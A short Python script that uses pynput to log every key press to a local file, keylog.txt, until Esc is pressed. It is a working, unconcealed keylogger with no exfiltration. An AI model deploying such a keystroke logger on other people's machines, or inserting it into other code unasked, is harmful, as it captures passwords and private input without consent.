import pynput
from pynput.keyboard import Key, Listener

# Create a log file
log_file = "keylog.txt"

def on_press(key):
    """Record key presses"""
    with open(log_file, "a") as f:
        f.write(f"{key} pressed\n")

def on_release(key):
    """Stop recording when Esc key is pressed"""
    if key == Key.esc:
        # Stop listener
        return False

# Create a keyboard listener
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()